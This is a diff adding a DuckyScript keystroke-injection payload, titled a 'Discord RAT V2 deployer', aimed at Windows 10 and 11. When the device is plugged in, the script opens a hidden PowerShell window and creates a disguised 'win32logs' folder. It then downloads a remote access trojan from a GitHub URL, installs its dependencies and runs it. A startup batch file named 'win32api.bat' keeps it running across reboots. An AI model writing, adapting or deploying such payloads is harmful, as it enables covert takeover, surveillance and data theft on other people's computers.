@@ -1,0 +1,27 @@
+REM Title: Discord RAT V2 deployer
+REM Description: Deploys my Discord RAT V2
+REM Author: simen64
+REM Target: Windows 10 or 11
+
+REM Change to your keyboard layout
+DUCKY_LANG NO
+
+REM define your constants here
+DEFINE #dc your discord token here
+DEFINE #ch your channel id here
+DEFAULT_DELAY 10
+
+DELAY 725
+CAPSLOCK_DISABLE
+GUI r
+DELAY 200
+STRINGLN powershell -W h -NonI -NoP
+DELAY 400
+STRING cd $env:T
+TAB
+STRING  ; NI -IT D
+TAB
+STRING  -P win32logs -F ; cd win32logs ; NI -P .env -F ; AC -V ("DISCORD_TOKEN=#dc", "CHANNEL=#ch") -Path .env ; python -m pip install --trusted-host pypi.org --trusted-host pypi.python.org --trusted-host files.pythonhosted.org Pillow pyperclip discord.py[voice] requests pyautogui python-dotenv --user ; Iwr https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/RAT-V2.py -O winlog.py ; NI -P "$env:AP
+TAB
+STRING \Microsoft\Windows\Start Menu\Programs\Startup\win32api.bat" -F ; '@echo off', 'start /B pythonw.exe "%TEMP%\win32logs\winlog.py"' | SC -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\win32api.bat" ; python winlog.py
+CAPSLOCK
